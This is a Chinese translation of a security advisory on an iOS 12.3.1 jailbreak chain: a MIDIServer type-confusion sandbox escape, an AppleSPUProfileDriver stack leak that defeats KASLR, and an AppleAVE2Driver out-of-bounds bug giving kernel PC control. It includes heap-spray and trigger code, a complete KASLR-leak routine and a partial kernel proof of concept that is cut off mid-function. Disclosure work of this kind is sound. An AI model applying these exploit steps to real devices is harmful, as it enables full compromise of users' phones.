@@ -1,0 +1,920 @@
+# 通过沙盒逃逸和内核R/W导致RCE的iOS越狱漏洞
+
+阅读量 **1340685**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2019-12-24 16:30:37
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章，文章原作者 ssd-disclosure，文章来源：ssd-disclosure.com
+
+原文地址：<https://ssd-disclosure.com/archives/4066/ssd-advisory-via-ios-jailbreak-sandbox-escape-and-kernel-r-w-leading-to-rce>
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+![](https://p2.ssl.qhimg.com/t010df51a839bec80cc.jpg)
+
+## 简介
+
+该漏洞是由安全研究员(08Tc3wBB)在TyphoonPwn 2019上所演示，并获得了60000美元的奖励！
+
+## 漏洞描述
+
+这篇文章描述了iOS 12.3.1中发现的一系列漏洞，将这些漏洞组合在一起后，可以在内核的上下文中执行代码。
+
+###  CVE
+
+CVE-2019-8797  
+CVE-2019-8795  
+CVE-2019-8794
+
+## 影响系统
+
+iOS 12.3.1
+
+## 漏洞分析
+
+虽然用户态可以访问一些内核的功能，但是由于iOS中沙盒机制的保护，很多攻击面是无法访问的。因此，逃逸沙盒对于攻击内核非常重要。
+
+###  沙盒逃逸
+
+与内核不同的是，在用户态中运行的许多守护进程都可以通过默认的应用访问沙盒。比如一个名为
+MIDIServer（com.apple.MIDIServer）的守护进程。这个守护进程允许其他应用程序和服务与可以连接到MIDI的设备进行交互。
+
+MIDIServer所有的功能都存储在一个库中，这个库是CoreMIDI框架的一部分:MIDIServer的main()函数只是调用MIDIServerRun()。
+
+CoreMIDI设置了两个可以访问沙盒的Mach服务:com.apple.midiserver和
+com.apple.midiserver.io。前者是一个基于mig的Mach服务。com.apple.midiserver.io是一个自定义实现，用于在客户端和服务器之间传输IO缓冲区。
+
+下面是io Mach服务运行的主线程:
+
+    
+    
+    __int64 MIDIIOThread::Run(MIDIIOThread *this, __int64 a2, __int64 a3, int *a4)
+    {
+      x0 = XMachServer::CreateServerPort("com.apple.midiserver.io", 3, this + 140, a4);
+      *(this + 36) = x0;
+    
+      if ( !*(this + 35) )
+      {
+        server_port = x0;
+        *(this + 137) = 1;
+        while ( 1 )
+        {
+          bufsz = 4;
+          if ( XServerMachPort::ReceiveMessage(&server_port, &msg_cmd, &msg_buf, &bufsz) || msg_cmd == 3 )
+            break;
+          ResolvedOpaqueRef<ClientProcess>::ResolvedOpaqueRef(&v10, msg_buf);
+          if ( v12 )
+          {
+            if ( msg_cmd == 1 )
+            {
+              ClientProcess::WriteDataAvailable(v12);
+            }
+            else if ( msg_cmd == 2 )
+            {
+              ClientProcess::EmptiedReadBuffer(v12);
+            }
+          }
+          if ( v10 )
+          {
+            applesauce::experimental::sync::LockFreeHashTable<unsigned int,BaseOpaqueObject *,(applesauce::experimental::sync::LockFreeHashTableOptions)1>::Lookup::~Lookup(&v11);
+            LOBYTE(v10) = 0;
+          }
+        }
+        x0 = XServerMachPort::~XServerMachPort(&server_port);
+      }
+    
+      return x0;
+    }
+    
+
+XServerMachPort::ReceiveMessage使用MACH_RCV_MSG参数调用mach_msg,等待该端口上的消息。这个消息包含一个命令ID和一个长度字段，后面是消息的主体，由ReceiveMessage调用解析。提供了三个命令：命令1将调用ClientProcess::WriteDataAvailable，命令2将调用ClientProcess::EmptiedReadBuffer，命令3将退出Mach服务循环。通过ResolvedOpaqueRef找到传递给ClientProcess调用的v12对象。这个方法将使用消息中提供的4字节缓冲区(对象ID)在哈希表中查找，将对象返回到堆栈上。
+
+这漏洞存在于ResolvedOpaqueRef<ClientProcess>::ResolvedOpaqueRef调用中。
+
+这个方法使用的哈希表实际上包含许多不同类型的对象，而不仅仅是ClientProcess类型的对象。例如，MIDIExternalDeviceCreate和MIDIDeviceAddEntity创建的对象都存储在此哈希表中。
+
+如果进行正确的类型检查，这里就没有问题。但是，实际上有两种访问此哈希表的方法：  
+BaseOpaqueObject::ResolveOpaqueRef  
+ResolvedOpaqueRef<ClientProcess>::ResolvedOpaqueRef  
+前一种在_MIDIDeviceAddEntity方法中使用，包含正确的类型检查：
+
+    
+    
+    midi_device = BaseOpaqueObject::ResolveOpaqueRef(&TOpaqueRTTI<MIDIDevice>::sRTTI, device_id);
+    
+
+但是，后一种方法没有。这意味着，通过提供不同类型对象的ID，可以在其中一个ClientProcess调用中导致类型混淆，而该方法需要ClientProcess*类型的对象。
+
+查看EmptiedReadBuffer的调用：
+
+    
+    
+    ; __int64 MIDIIOThread::Run(MIDIIOThread *this)
+    __ZN12MIDIIOThread3RunEv
+    [...]
+    BL              __ZN13ClientProcess17EmptiedReadBufferEv ; ClientProcess::EmptiedReadBuffer(x0) // `x0` is potentially type confused
+    
+    
+    ; __int64 ClientProcess::EmptiedReadBuffer(ClientProcess *this)
+    __ZN13ClientProcess17EmptiedReadBufferEv
+                    STP             X20, X19, [SP,#-0x10+var_10]!
+                    STP             X29, X30, [SP,#0x10+var_s0]
+                    ADD             X29, SP, #0x10
+                    MOV             X19, X0
+                    ADD             X0, X0, #0x20 ; this
+                    BL              __ZN22MIDIIORingBufferWriter19EmptySecondaryQueueEv ; MIDIIORingBufferWriter::EmptySecondaryQueue(x0)
+    
+    
+    ; bool MIDIIORingBufferWriter::EmptySecondaryQueue(MIDIIORingBufferWriter *this)
+    __ZN22MIDIIORingBufferWriter19EmptySecondaryQueueEv
+    
+                    STP             X28, X27, [SP,#-0x10+var_50]!
+                    STP             X26, X25, [SP,#0x50+var_40]
+                    STP             X24, X23, [SP,#0x50+var_30]
+                    STP             X22, X21, [SP,#0x50+var_20]
+                    STP             X20, X19, [SP,#0x50+var_10]
+                    STP             X29, X30, [SP,#0x50+var_s0]
+                    ADD             X29, SP, #0x50
+                    MOV             X21, X0
+                    MOV             X19, X0 ; x19 = (MIDIIORingBufferWritter *)this
+                    LDR             X8, [X19,#0x58]!
+                    LDR             X8, [X8,#0x10]
+                    MOV             X0, X19
+    
+
+如上所见，EmptiedReadBuffer代码将有效地立即取消对类型混乱对象中的两个指针的引用，并将其转移到一个可以被攻击者控制的地址。这个调用看起来是这样的:  
+如上所见，EmptiedReadBuffer将取消对类型混淆对象中几个指针的引用，并跳转到一个可以由攻击者控制的地址。调用看起来像这样：obj->
+0x78-> 0x10（obj-> 0x20）。
+
+## 漏洞利用
+
+为了利用这个漏洞，我们可以将ClientProcess类型与MIDIEntity实例混淆。MIDIEntity的大小为0x78，这表示着对象执行的第一次取消引用（在0x78处）将超出内存范围。然后，可以在MIDIEntity对象之后对一些受控制的数据进行对齐，因为我们处于用户态，所以有更好的方法。
+
+MIDIObjectSetDataProperty
+API调用将把CoreFoundation对象反序列化到MIDIServer的堆中，因此使用这个调用可以喷射大小为0x90的CFData对象。然后利用此漏洞发送两个包含OOL内存描述符的Mach消息，将其映射到静态地址0x29f000000（由于某些原因，需要发送两次该消息，否则将不会映射内存；我不确定具体原因），这个内存是一个连续的CoW映射，包含稍后要使用的ROP链，而且重要的是一个位于0x10偏移处的函数指针，将被EmptySecondaryQueue取消引用。
+
+下面的代码将设置CFData对象被加入MIDIServer的堆中：
+
+    
+    
+    Prepare_bunch_keys(); // For iterating
+      size_t spraybufsize = 0x90;
+      void *spraybuf = malloc(spraybufsize);
+      for(int i=0; i<spraybufsize; i+=0x8){
+          *(uint64_t*)(spraybuf + i) = SPRAY_ADDRESS; // The 0x29f000000 address
+      }
+      CFDataRef spraydata = CFDataCreate(kCFAllocatorDefault, spraybuf, spraybufsize);
+    
+
+堆的构造：
+
+    
+    
+    // OSStatus MIDIClientCreate(CFStringRef name, MIDINotifyProc notifyProc, void *notifyRefCon, MIDIClientRef *outClient);
+      uint32_t mclient_id = 0;
+      MIDIClientCreate(CFSTR(""), useless_notify, NULL, &mclient_id);
+      printf("MIDI Client ID: 0x%xn", mclient_id);
+    
+      // OSStatus MIDIExternalDeviceCreate(CFStringRef name, CFStringRef manufacturer, CFStringRef model, MIDIDeviceRef *outDevice);
+      uint32_t mdevice_id = 0;
+      MIDIExternalDeviceCreate(CFSTR(""), CFSTR(""), CFSTR(""), &mdevice_id);
+      printf("MIDI Device ID: 0x%xn", mdevice_id);
+    
+      // OSStatus MIDIObjectSetDataProperty(MIDIObjectRef obj, CFStringRef propertyID, CFDataRef data);
+      for (int i = 0; i < 300; i++)
+      {
+          MIDIObjectSetDataProperty(mdevice_id, bunchkeys[i], spraydata); // Each call will unserialize one CFData object of size 0x90 
+      }
+    
+      // Sends 1 OOL descriptor each with the spray memory mapping 
+      Send_spray_mem();
+      Send_spray_mem();
+    
+      // OSStatus MIDIObjectRemoveProperty(MIDIObjectRef obj, CFStringRef propertyID);
+      // Removes every other property we just added
+      for (int i = 0; i < 300; i = i + 2)
+      {
+          MIDIObjectRemoveProperty(mdevice_id, bunchkeys[i]); // Free's the CFData object, popping holes on the heap 
+      }
+    
+
+我们现在分配了150个CFData和150个大小为0x90空闲的空间，全部包含SPRAY_ADDRESS指针。下一步是使用MIDIEntity对象填充其中一个漏洞:
+
+    
+    
+     uint32_t mentity_id = 0;
+      MIDIDeviceAddEntity(mdevice_id, CFSTR(""), false, 0, 0, &mentity_id);
+      printf("mentity_id = 0x%xn", mentity_id);
+    
+
+如果一切按计划进行，那么现在应该在堆上有一块内存，其中第一个0x78字节用有效的MIDIEntity对象填充，剩下的0x18字节用SPRAY_ADDRESS指针填充。
+
+为了触发这个漏洞，我们可以使用MIDIEntity对象ID（mentity_id）调用com.apple.midiserver.io Mach服务：
+
+    
+    
+     // Sends msgh_id 0 with cmd 2 and datalen 4 (ClientProcess::EmptiedReadBuffer)
+      Init_triggerExp_msg(mentity_id);
+      Send_triggerExp_msg();
+    
+
+它将启动MIDIServer进程中Mach服务线程上的ROP链。
+
+然后根据新对象的ID判断是否触发漏洞：
+
+    
+    
+    // OSStatus MIDIExternalDeviceCreate(CFStringRef name, CFStringRef manufacturer, CFStringRef model, MIDIDeviceRef *outDevice);
+      uint32_t verifysucc_mdevice_id = 0;
+      MIDIExternalDeviceCreate(CFSTR(""), CFSTR(""), CFSTR(""), &verifysucc_mdevice_id);
+      printf("verify_mdevice_id: 0x%xn", verifysucc_mdevice_id);
+    
+      if (verifysucc_mdevice_id == mdevice_id + 2) 
+      {
+          break;
+      }
+    
+      // We failed, reattempting...
+      printf("Try againn");
+      MIDIRestart();
+    
+
+如果对象ID不连续，则表示利用失败（守护进程崩溃），因此可以通过MIDIRestart调用重新启动守护进程，然后可以重新尝试利用漏洞。
+
+这里不会详细介绍ROP链的原理，基本思路是在SPRAY_ADDRESS内存映射中的缓冲区上调用objc_release，在这个地址上伪造一个假的Objective-C对象，在这个对象上执行release方法。然后创建一个原始的调用链，目的是打开3个userclients，并挂在mach_msg_receive调用中，以便稍后在收到消息时通过vm_read_overwrite覆盖一些内存—这将在稍后的内核利用中使用。
+
+需要注意的是，对于这种基于ROP的利用方法，A12和更新的处理器需要绕过PAC。
+
+从MIDIServer获取的userclients是AppleSPUProfileDriver，IOSurfaceRoot和AppleAVE2Driver。
+
+###  使用AppleSPUProfileDriver：攻破内核ASLR
+
+通过MIDIServer我们可以访问AppleSPUProfileDriver
+userclient，这个userclient实现了12个方法，但是我们只对AppleSPUProfileDriverUserClient::extSignalBreak感兴趣。查看伪代码，大概了解一下做了什么：
+
+    
+    
+    __int64 AppleSPUProfileDriver::signalBreakGated(AppleSPUProfileDriver *this)
+    {
+      __int64 dataQueueLock; // x19
+      unsigned __int64 v8; // x0
+      __int64 result; // x0
+      int v10; // [xsp+8h] [xbp-48h]
+      int v11; // [xsp+Ch] [xbp-44h]
+      __int64 v12; // [xsp+10h] [xbp-40h]
+      __int64 v13; // [xsp+38h] [xbp-18h]
+    
+      dataQueueLock = this->dataQueueLock;
+      IORecursiveLockLock(this->dataQueueLock);
+    
+      if ( this->dataQueue )
+      {
+        v10 = 0;
+        abs_time = mach_absolute_time();
+        v12 = AppleSPUProfileDriver::absolutetime_to_sputime(this, abs_time);
+        v11 = OSIncrementAtomic(&this->atomicCount);
+        (*(*this->dataQueue + 0x88âˆ‚LL))();           // IOSharedDataQueue::enqueue(&v10, 0x30)
+      }
+    
+      result = IORecursiveLockUnlock(dataQueueLock);
+    
+      return result;
+    }
+    
+
+这个函数通过一个锁，将一些数据写入堆栈上存储的缓冲区，并调用IOSharedDataQueue::enqueue将该数据提交到队列，缓冲区大小为0x30。这里访问堆栈的方式不是特别清楚，所以来看下反汇编部分代码：
+
+    
+    
+    ; __int64 AppleSPUProfileDriver::signalBreakGated(AppleSPUProfileDriver *this)
+    __ZN21AppleSPUProfileDriver16signalBreakGatedEv
+    
+    var_48          = -0x48
+    var_44          = -0x44
+    var_40          = -0x40
+    var_18          = -0x18
+    var_10          = -0x10
+    var_s0          =  0
+    
+                    PACIBSP
+                    SUB             SP, SP, #0x60
+                    STP             X20, X19, [SP,#0x50+var_10]
+                    STP             X29, X30, [SP,#0x50+var_s0]
+                    ADD             X29, SP, #0x50
+                    MOV             X20, X0
+                    ADRP            X8, #___stack_chk_guard@PAGE
+                    NOP
+                    LDR             X8, [X8,#___stack_chk_guard@PAGEOFF]
+                    STUR            X8, [X29,#var_18]
+                    LDR             X19, [X0,#0x30B8]
+                    MOV             X0, X19
+                    BL              _IORecursiveLockLock
+                    LDR             X8, [X20,#0x90]
+                    CBZ             X8, branch_exit_stub
+                    STR             WZR, [SP,#0x50+var_48]
+                    BL              _mach_absolute_time
+                    MOV             X1, X0  ; unsigned __int64
+                    MOV             X0, X20 ; this
+                    BL              __ZN21AppleSPUProfileDriver23absolutetime_to_sputimeEy ; AppleSPUProfileDriver::absolutetime_to_sputime(ulong long)
+                    STR             X0, [SP,#0x50+var_40]
+                    MOV             W8, #0x30CC
+                    ADD             X0, X20, X8
+                    BL              _OSIncrementAtomic
+                    STR             W0, [SP,#0x50+var_44]
+                    LDR             X0, [X20,#0x90]
+                    LDR             X8, [X0]
+                    LDRAA           X9, [X8,#0x90]!
+                    MOVK            X8, #0x911C,LSL#48
+                    ADD             X1, SP, #0x50+var_48
+                    MOV             W2, #0x30
+                    BLRAA           X9, X8                        // Call to IOSharedDataQueue::enqueue
+    
+    branch_exit_stub                    ; CODE XREF: AppleSPUProfileDriver::signalBreakGated(void)+38
+                    MOV             X0, X19 ; lock
+                    BL              _IORecursiveLockUnlock
+                    LDUR            X8, [X29,#var_18]
+                    ADRP            X9, #___stack_chk_guard@PAGE
+                    NOP
+                    LDR             X9, [X9,#___stack_chk_guard@PAGEOFF]
+                    CMP             X9, X8
+                    B.NE            branch_stack_chk_fail
+                    MOV             W0, #0
+                    LDP             X29, X30, [SP,#0x50+var_s0]
+                    LDP             X20, X19, [SP,#0x50+var_10]
+                    ADD             SP, SP, #0x60
+                    RETAB
+    ; ---------------------------------------------------------------------------    
+    branch_stack_chk_fail                    ; CODE XREF: AppleSPUProfileDriver::signalBreakGated(void)+9C
+                    BL              ___stack_chk_fail
+    
+
+可以看到32位值为零保存在var_48中，OSIncrementAtomic调用的结果保存在var_44中，absolutetime_to_sputime的返回值保存在var_40中，但是，还记得为IOSharedDataQueue::enqueue调用提供了0x30大小吗？这意味着任何未初始化的堆栈数据都将泄漏到dataqueue中！虽然dataqueue可能包含泄漏的数据，如果我们不能访问此数据，那将不会对安全产生任何影响。但是，IOSharedDataQueue被签名成完全共享。让我们来看下AppleSPUProfileDriverUserClient::clientMemoryForType:
+
+    
+    
+    __int64 AppleSPUProfileDriverUserClient::clientMemoryForType(AppleSPUProfileDriverUserClient *this, int type, unsigned int *options, IOMemoryDescriptor **memory)
+    {
+      [...]
+    
+      ret = 0xE00002C2LL;
+      if ( !type )
+      {
+        memDesc = AppleSPUProfileDriver::copyBuffer(this->provider);
+        *memory = memDesc;
+    
+        if ( memDesc )
+          ret = 0LL;
+        else
+          ret = 0xE00002D8LL;
+      }
+    
+      return ret;
+    }
+    
+    __int64 AppleSPUProfileDriver::copyBuffer(AppleSPUProfileDriver *this)
+    {
+      [...]
+    
+      dataQueueLock = this->dataQueueLock;
+      IORecursiveLockLock(this->dataQueueLock);
+    
+      memDesc = this->queueMemDesc;
+      if ( memDesc )
+      {
+        (*(*memDesc + 0x20LL))();                   // OSObject::retain
+        buf = this->queueMemDesc;
+      }
+      else
+      {
+        buf = 0LL;
+      }
+    
+      IORecursiveLockUnlock(dataQueueLock);
+    
+      return buf;
+    }
+    
+
+因此，通过IOConnectMapMemory64我们可以将IOSharedDataQueue映射到内存描述符中，该描述符包含排队的所有数据，包括泄漏的栈数据！为了确定这个漏洞，我们再来看一个队列泄漏数据的例子:
+
+    
+    
+    30 00 00 00 
+    00 00 00 00 78 00 00 80 
+    c0 5a 0c 03 00 00 00 00 
+    00 f0 42 00 e0 ff ff ff 
+    50 b4 d8 3b e0 ff ff ff 
+    80 43 03 11 f0 ff ff ff 
+    00 00 00 00 00 00 00 00
+    
+
+可以看到第一个dword是IODataQueueEntry结构的size字段（在本例中为0x30），该字段位于队列中每个数据块的前面：
+
+    
+    
+    typedef struct _IODataQueueEntry{
+        UInt32  size;
+        UInt8   data[4];
+    } IODataQueueEntry;
+    
+
+然后我们第三行中看到OSIncrementAtomic的返回值(0x78)和absolutetime_to_sputime的值，数据之后是3个内核指针，它们是从堆栈中泄漏出来。具体来说，我们对第三个指针（0xfffffff011034380）感兴趣。根据我的测试(iPhone
+8, iOS 12.4)，这个指针总是指向内核的__TEXT段，因此通过计算指针偏移，我们可以推断出内核的偏移。信息泄漏的exploit如下所示：
+
+    
+    
+    uint64_t check_memmap_for_kaslr(io_connect_t ioconn)
+    {
+        kern_return_t ret;
+        mach_vm_address_t map_addr = 0;
+        mach_vm_size_t map_size = 0;
+    
+        ret = IOConnectMapMemory64(ioconn, 0, mach_task_self(), &map_addr, &map_size, kIOMapAnywhere);
+        if (ret != KERN_SUCCESS)
+        {
+            printf("IOConnectMapMemory64 failed: %x %sn", ret, mach_error_string(ret));
+            return 0x0;
+        }
+    
+        uint32_t search_val = 0xfffffff0; // Constant value of Kernel code segment higher 32bit addr
+        uint64_t start_addr = map_addr;
+        size_t search_size = map_size;
+    
+        while ((start_addr = (uint64_t)memmem((const void *)start_addr, search_size, &search_val, sizeof(search_val))))
+        {
+            uint64_t tmpcalc = *(uint64_t *)(start_addr - 4) - INFOLEAK_ADDR;
+    
+            // kaslr offset always be 0x1000 aligned
+            if ((tmpcalc & 0xFFF) == 0x0)
+            {
+                return tmpcalc;
+            }
+    
+            start_addr += sizeof(search_val);
+            search_size = (uint64_t)map_addr + search_size - start_addr;
+        }
+    
+        return 0x0;
+    }
+    
+    mach_vm_offset_t get_kaslr(io_connect_t ioconn)
+    {
+        uint64_t scalarInput = 1;
+    
+        // Allocte a new IOSharedDataQueue 
+        // AppleSPUProfileDriverUserClient::extSetEnabledMethod
+        IOConnectCallScalarMethod(ioconn, 0, &scalarInput, 1, NULL, NULL);
+    
+        int kaslr_iter = 0;
+        while (!kaslr)
+        {
+            // AppleSPUProfileDriverUserClient::extSignalBreak
+            // Enqueues a data item of size 0x30, leaking 0x18 bytes off the stack 
+            IOConnectCallStructMethod(ioconn, 11, NULL, 0, NULL, NULL);
+    
+            // Map the IOSharedDataQueue and look for the leaked ptr 
+            kaslr = check_memmap_for_kaslr(ioconn);
+    
+            if (kaslr_iter++ % 5 == 0)
+            {
+                scalarInput = 0;
+                // AppleSPUProfileDriverUserClient::extSetEnabledMethod
+                IOConnectCallScalarMethod(ioconn, 0, &scalarInput, 1, NULL, NULL);
+    
+                scalarInput = 1;
+                // AppleSPUProfileDriverUserClient::extSetEnabledMethod
+                IOConnectCallScalarMethod(ioconn, 0, &scalarInput, 1, NULL, NULL);
+            }
+        }
+    
+        scalarInput = 0;
+        // AppleSPUProfileDriverUserClient::extSetEnabledMethod
+        IOConnectCallScalarMethod(ioconn, 0, &scalarInput, 1, NULL, NULL); // Shutdown
+    
+        return kaslr;
+    }
+    
+
+###  攻击内核
+
+最后一个漏洞是AppleAVE2Driver中缺少边界检查，AppleAVE2是iOS中的图形驱动程序，在本例中，可通过沙盒逃逸来访问MIDIServer。userclient公开了24个方法，这个漏洞存在于索引7的方法中:_SetSessionSettings。该方法获取一个大小为0x108的输入缓冲区，并通过AppleAVE2Driver::GetIOSurfaceFromCSID方法从输入缓冲区中提供的ID加载IOSurfaces，最后调用AppleAVE2Driver::Enqueue。具体来说，该方法将加载一个名为InitInfoSurfaceId或InitInfoBufferr的表:
+
+    
+    
+    if ( !structIn->InitInfoSurfaceId )
+      {
+        goto err;
+      }
+    
+      [...]
+    
+      initInfoSurfaceId = structIn->InitInfoSurfaceId;
+      if ( initInfoSurfaceId )
+      {
+        initInfoBuffer = AppleAVE2Driver::GetIOSurfaceFromCSID(this->provider, initInfoSurfaceId, this->task);
+        this->InitInfoBuffer = initInfoBuffer;
+        if ( initInfoBuffer )
+          goto LABEL_13;
+    
+        goto err;
+      }
+    
+
+然后AppleAVE2Driver::Enqueue方法将在IOSurface上创建一个IOSurfaceBufferMngr实例：
+
+    
+    
+    bufferMgr = operator new(0x70uLL);
+      if ( !IOSurfaceBufferMngr::IOSurfaceBufferMngr(bufferMgr, 0LL, this) )
+      {
+        goto LABEL_23;
+      }
+    
+      if ( IOSurfaceBufferMngr::CreateBufferFromIOSurface(
+             bufferMgr,
+             service->InitInfoBuffer,
+             this->iosurfaceRoot,
+             *&this->gap8[128],
+             *&this->gap8[136],
+             1,
+             0,
+             0,
+             0,
+             0,
+             *&this->gap101[39],
+             "InitInfo",
+             this->gap3AF[49],
+             0x1F4u) )
+      {
+        err = 0xE00002BDLL;
+        v28 = IOSurfaceBufferMngr::~IOSurfaceBufferMngr(bufferMgr);
+        operator delete(v28);
+        return err;
+      }
+    
+      if ( bufferMgr->size < 0x25DD0 )
+      {
+        err = 0xE00002BCLL;
+        goto LABEL_27;
+      }
+    
+      buffMgrKernAddr = bufferMgr->kernelAddress;
+      if ( !buffMgrKernAddr )
+      {
+        goto LABEL_20;
+      }
+    
+
+考虑到这个缓冲区中的数据（现在映射到buffMgrKernAddr）是由userland控制的，该方法将继续将缓冲区中的大块数据复制到AVEClient*对象中，现在将其命名为currentClient：
+
+    
+    
+    currentClient->unsigned2400 = *(buffMgrKernAddr + 2008);
+      memmove(&currentClient->unsigned2404, buffMgrKernAddr + 2012, 0x2BE4LL);
+      currentClient->oword5018 = *(buffMgrKernAddr + 13296);
+      currentClient->oword5008 = *(buffMgrKernAddr + 13280);
+      currentClient->oword4FF8 = *(buffMgrKernAddr + 13264);
+      currentClient->oword4FE8 = *(buffMgrKernAddr + 13248);
+      currentClient->oword5058 = *(buffMgrKernAddr + 13360);
+      currentClient->memoryInfoCnt2 = *(buffMgrKernAddr + 0x3420);
+      currentClient->oword5038 = *(buffMgrKernAddr + 13328);
+      currentClient->oword5028 = *(buffMgrKernAddr + 13312);
+      currentClient->oword5098 = *(buffMgrKernAddr + 13424);
+      currentClient->oword5088 = *(buffMgrKernAddr + 13408);
+      currentClient->oword5078 = *(buffMgrKernAddr + 13392);
+      currentClient->oword5068 = *(buffMgrKernAddr + 13376);
+      currentClient->oword50C8 = *(buffMgrKernAddr + 13472);
+      currentClient->oword50B8 = *(buffMgrKernAddr + 13456);
+      currentClient->oword50A8 = *(buffMgrKernAddr + 13440);
+      currentClient->qword50D8 = *(buffMgrKernAddr + 13488);
+      memmove(&currentClient->sessionSettings_block1, buffMgrKernAddr, 0x630LL);
+      memmove(&currentClient->gap1C8C[0x5CC], buffMgrKernAddr + 1584, 0x1A8LL);
+    
+
+通过AppleAVE2DriverUserClient::_ my_close关闭AppleAVE2Driver
+userclient时，将调用一个名为AppleAVE2Driver::AVE_DestroyContext的函数，该函数位于该userclient关联的AVEClient对象上。AVE_DestroyContext在AVEClient中MEMORY_INFO结构上调用AppleAVE2Driver::DeleteMemoryInfo，并且在倒数第二步客户端的MEMORY_INFO结构数组上调用此函数，其数量由memoryInfoCnt{1,2}字段表示：
+
+    
+    
+     v73 = currentClient->memoryInfoCnt1 + 2;
+      if ( v73 <= currentClient->memoryInfoCnt2 )
+        v73 = currentClient->memoryInfoCnt2;
+    
+      if ( v73 )
+      {
+        iter1 = 0LL;
+        statsMapBufArr = currentClient->statsMapBufferArray;
+    
+        do
+        {
+          AppleAVE2Driver::DeleteMemoryInfo(this, statsMapBufArr);
+          ++iter1;
+    
+          loopMax = currentClient->memoryInfoCnt1 + 2;
+          cnt2 = currentClient->memoryInfoCnt2;
+    
+          if ( loopMax <= cnt2 )
+            loopMax = cnt2;
+          else
+            loopMax = loopMax;
+    
+          statsMapBufArr += 0x28LL;
+        }
+        while ( iter1 < loopMax );
+      }
+    
+
+在_SetSessionSettings中，对memoryInfoCnt1的值进行边界检查：
+
+    
+    
+    if ( currentClient->memoryInfoCnt1 >= 4u )
+      {
+        ret = 0xE00002BCLL;
+        return ret;
+      }
+    
+
+但是，没有检查memoryInfoCnt2的值。这里缺少检查，加上while循环中的逻辑，意味着如果提供足够大的memoryInfoCnt2值，循环将越界访问和调用DeleteMemoryInfo上的数据:
+
+    
+    
+    loopMax = currentClient->memoryInfoCnt1 + 2;  // Take memoryInfoCnt1 (max 4), loopMax is <=6
+    
+      cnt2 = currentClient->memoryInfoCnt2;         // Take memoyInfoCnt2
+      if ( loopMax <= cnt2 )                        // if cnt2 is larger than loopMax...
+        loopMax = cnt2;                             // update loopMax to the value of memoryInfoCnt2
+      else
+        loopMax = loopMax;                          // else, no change
+    
+
+默认情况下，statsMapBufferArray中有5个MEMORY_INFO结构。由于每个大小为0x28，数组将占用0xc8（十进制：200）字节。由于这个数组是在AVEClient*对象中内联的，当我们触发越界错误时，下一个DeleteMemoryInfo调用将使用statsMapBufferArray之后所有的数据。在我的iPhone
+8的12.4内核上，这个数组的偏移量是0x1b60，也就是说第6项（第一个越界项）位于偏移量0x1c28处。
+
+现在，还记得在SetSessionSettings中，如何将大块数据从用户控制的缓冲区复制到AVEClient对象中吗？恰好其中一个受控制缓冲区位于statsMapBufferArray字段之后!
+
+    
+    
+    00000000 AVEClient       struc ; (sizeof=0x29AC8, align=0x8, mappedto_215)
+      [...]
+      00001B60 statsMapBufferArray DCB 200 dup(?)
+      00001C28 sessionSettings_block1 DCB ?
+      [...]
+    
+    
+    
+    // Copies from the IOSurface buffer to a buffer adjacent to the statsMapBufferArray
+      memmove(&currentClient->sessionSettings_block1, buffMgrKernAddr, 0x630LL);
+    
+
+因此，通过在复制到AVEClient的IOSurface缓冲区中提供精心构建的数据，我们完全可以控制越界数组条目。
+
+###  获取控制（PC）
+
+现在，我们看一下AppleAVE2Driver::DeleteMemoryInfo函数原型，记住我们对memInfo对象具有完全控制权限：
+
+    
+    
+    __int64 AppleAVE2Driver::DeleteMemoryInfo(AppleAVE2Driver *this, IOSurfaceBufferMngr **memInfo)
+    {
+      [...]
+    
+      if ( memInfo )
+      {
+        if ( *memInfo )
+        {
+          v8 = IOSurfaceBufferMngr::~IOSurfaceBufferMngr(*memInfo);
+          operator delete(v8);
+        }
+        memset(memInfo, 0, 0x28uLL);
+        result = 0LL;
+      }
+      else
+      {
+        result = 0xE00002BCLL;
+      }
+    
+      return result;
+    }
+    
+
+IOSurfaceBufferMngr的析构函数直接封装了一个静态的IOSurfaceBufferMngr::RemoveBuffer调用:
+
+    
+    
+    IOSurfaceBufferMngr *IOSurfaceBufferMngr::~IOSurfaceBufferMngr(IOSurfaceBufferMngr *this)
+    {
+      IOSurfaceBufferMngr::RemoveBuffer(this);
+      return this;
+    }
+    
+
+然后RemoveBuffer调用IOSurfaceBufferMngr::CompleteFence，在本例中，汇编代码如下：
+
+    
+    
+    IOSurfaceBufferMngr::CompleteFence(IOSurfaceBufferMngr *this)
+    
+                    STP             X20, X19, [SP,#-0x10+var_10]!
+                    STP             X29, X30, [SP,#0x10+var_s0]
+                    ADD             X29, SP, #0x10
+                    MOV             X19, X0                         // x19 = x0 (controlled pointer)
+                    LDR             X0, [X0,#0x58]                  // Loads x0->0x58
+                    CBZ             X0, exit_stub                   // Exits if the value is zero 
+                    LDRB            W8, [X19,#0x1E]                 // Loads some byte at x19->0x1e
+                    CBNZ            W8, exit_stub                   // Exits if the byte is non-zero
+                    MOV             W1, #0
+                    BL              IOFence::complete
+                    LDR             X0, [X19,#0x58]                 // Loads x19->0x58
+                    LDR             X8, [X0]                        // Loads x0->0x0
+                    LDR             X8, [X8,#0x28]                  // Loads function pointer x8->0x28
+                    BLR             X8                              // Branches to fptr, giving arbitrary PC control
+                    STR             XZR, [X19,#0x58]
+    
+    exit_stub
+                    LDP             X29, X30, [SP,#0x10+var_s0]
+                    LDP             X20, X19, [SP+0x10+var_10],#0x20
+                    RET
+    
+
+本质上，通过创建一个userland共享缓冲区，可以触发一个越界访问，这将直接在关闭userclient时提供任意PC控制。  
+下面是这个漏洞的PoC，它将使设备崩溃，并导致取消对地址0x4141414142424242的引用:
+
+    
+    
+    void kernel_bug_poc(io_connect_t ioconn, io_connect_t surface_ioconn)
+    {
+        kern_return_t ret;
+    
+        {
+            char open_inputStruct[0x8] = { 0 };
+            char open_outputStruct[0x4] = { 0 };
+            size_t open_outputStruct_size = sizeof(open_outputStruct);
+    
+            // AppleAVE2UserClient::_my_open
+            ret = IOConnectCallStructMethod(ioconn, 
+                                            0, 
+                                            open_inputStruct, 
+                                            sizeof(open_inputStruct), 
+                                            open_outputStruct, 
+                                            &open_outputStruct_size);
+            NSLog(@"my_open: %x %s", ret, mach_error_string(ret));
+        }
+    
+        // Create an IOSurface using the IOSurface client owned by MIDIServer
+        // Address & size of the shared mapping created by IOSurface and
+        // returned in the output struct at offsets 0x0 and 0x1c respectively
+        uint64_t surface_map_addr = 0x0;
+        uint32_t surface_map_size = 0x0;
